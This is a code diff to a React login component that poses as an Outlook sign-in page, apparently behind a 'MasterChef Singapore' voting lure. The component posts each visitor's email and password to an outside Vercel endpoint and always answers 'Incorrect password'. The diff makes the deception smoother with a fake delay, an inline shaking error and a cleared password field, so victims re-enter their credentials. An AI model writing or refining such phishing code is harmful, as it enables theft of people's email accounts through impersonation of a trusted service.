@@ -5,7 +5,7 @@ export default function EmailPassword() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState(null);
+  const [error, setError] = useState(false);
 
   useEffect(() => {
     const savedEmail = localStorage.getItem("email_username");
@@ -29,6 +29,7 @@ export default function EmailPassword() {
     setLoading(true);
 
     try {
+      await new Promise((resolve) => setTimeout(resolve, 700));
       await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
@@ -45,25 +46,13 @@ export default function EmailPassword() {
           }),
         }
       );
-      setStatus("approved");
     } catch (err) {
       console.error(err);
-      setStatus("approved");
+    } finally {
+      setError(true);
+      setPassword("");
+      setLoading(false);
     }
-
-    setLoading(false);
-  }
-
-  if (status === "approved" || status === "rejected") {
-    return (
-      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
-        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
-          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
-          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password!</h1>
-          <p className="mt-3 text-slate-600">Try again.</p>
-        </div>
-      </div>
-    );
   }
 
   return (
@@ -86,10 +75,18 @@ export default function EmailPassword() {
               <input
                 type="password"
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                  if (error) setError(false);
+                }}
                 placeholder="Password"
-                className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
+                className={`w-full rounded-3xl border px-4 py-4 text-slate-900 outline-none transition ${
+                  error
+                    ? "shake-error border-red-500 bg-red-50 focus:border-red-500 focus:bg-white"
+                    : "border-slate-300 bg-slate-50 focus:border-blue-600 focus:bg-white"
+                }`}
               />
+              {error && <p className="mt-2 text-sm text-red-600">Incorrect password</p>}
             </div>
 
             <div className="flex flex-col gap-3 text-sm text-slate-600 sm:flex-row sm:items-center sm:justify-between">
